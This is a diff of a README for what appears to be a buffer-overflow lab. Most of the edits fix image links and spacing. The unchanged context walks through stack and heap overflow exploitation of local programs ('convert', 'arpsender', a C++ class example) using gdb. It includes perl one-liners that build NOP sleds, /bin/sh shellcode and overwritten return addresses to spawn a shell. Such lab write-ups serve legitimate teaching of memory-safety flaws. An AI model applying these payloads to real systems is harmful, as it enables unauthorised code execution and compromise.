@@ -58,7 +58,8 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 So the size of the buffer to overwrite the `$eip` is 756.
 ###### Sketch memory layout and attack plan
-<img src="https://github.com/igavriil/buffer-overflow/blob/master/convert_attact.png" width="500" height="360" />
+<img src="(https://raw.githubusercontent.com/igavriil/buffer-overflow/master/convert_attact.png" width="500" height="360"/>
+
 ###### Find the addresses needed for the attack
 ``` 
 $ gdb convert
@@ -150,7 +151,7 @@ Stack level 0, frame at 0xbffff500:
   ebp at 0xbffff4f8, eip at 0xbffff4fc
 ```
 ###### Sketch memory layout
-<img src="https://github.com/igavriil/buffer-overflow/blob/master/arpsender_sketch.png" width="300" height="440" />
+<img src="https://raw.githubusercontent.com/igavriil/buffer-overflow/master/arpsender_sketch.png" width="300" height="440"/>
 ###### Deeper understand of memory and attack plan
 * The distance between `char hwaddr.addr[128]` and `char* hwaddr.hwtype` is `131 bytes`(due to big endian convention)  so we need `135 bytes` overflow on `hwaddr.addr[128]` to overwrite the `4 bytes` of the pointer.
 * The `$eip` pointer is located at `0xbffff4fc` under gdb environment.
@@ -171,11 +172,12 @@ So in the 5th byte of the input `packet`, the number `135` should be placed, or 
 * The bytes to be copied to `hwaddr.addr` from the packet are read from `packet + ADDR_OFFSET -> packet + 8` so we need to place our shell code from that place and after.
 
 ###### Sketch attack plan
-<img src="https://github.com/igavriil/buffer-overflow/blob/master/arpsender_attack.png" width="650" height="200" />
+<img src="https://github.com/igavriil/buffer-overflow/blob/master/arpsender_attack.png" width="650" height="200"/>
 ###### Create your inputs according to the sketch and run the programm
 ```
 perl -e 'print "\x69\xf4\xff\xbf\x87" ."\x90\x90\x90" . "\x90" x86 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"."\xfc\xf4\xff\xbf"' >packet.txt
 ```
+
 ```
 $ ./arpsender packet.txt
 ...
@@ -191,6 +193,7 @@ Rewrite the `packet.txt` with the shifted addresses
 ```
 perl -e 'print "\x79\xf4\xff\xbf\x87" ."\x90\x90\x90" . "\x90" x86 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"."\x0c\xf5\xff\xbf"' >packet.txt
 ```
+
 ```
 $ ./arpsender packet.txt
 $ (unlocked shell)
@@ -209,6 +212,7 @@ There are two interesting things in the base class enabling a succesfull attack:
 
 ###### Exploring and sketching the memory
 Let's jump into our - familiar by now - gdb environment
+
 ```
 (gdb) disas main
 Dump of assembler code for function main(int, char**):
@@ -255,6 +259,7 @@ ebx            0x804a110	134521104
 ```
 ___
 Let's look in a more traditional way and follow the links
+
 ```
 (gdb) run -f $(perl -e 'print "AAAA"."BBBB"."C"x244 . "XXXX"') -c $(perl -e 'print "DDDD"."EEEE"."X"x244 . "FFFF"') -s 1
 
@@ -319,10 +324,10 @@ $4 = (Animal *) 0x804a008
 0x804a108:	0x46464646	0x00000100	0x08048d10	0x41414141
 ```
 So now we can sketch the memory:
-<img src="https://github.com/igavriil/buffer-overflow/blob/master/master.png" width="500" height="450" />
+<img src="https://raw.githubusercontent.com/igavriil/buffer-overflow/master/master.png" width="500" height="450"/>
 
 ###### Preparing the attacks
-<img src="https://github.com/igavriil/buffer-overflow/blob/master/master_attack.png" width="500" height="360" />
+<img src="https://raw.githubusercontent.com/igavriil/buffer-overflow/master/master_attack.png" width="500" height="360"/>
 
 
 
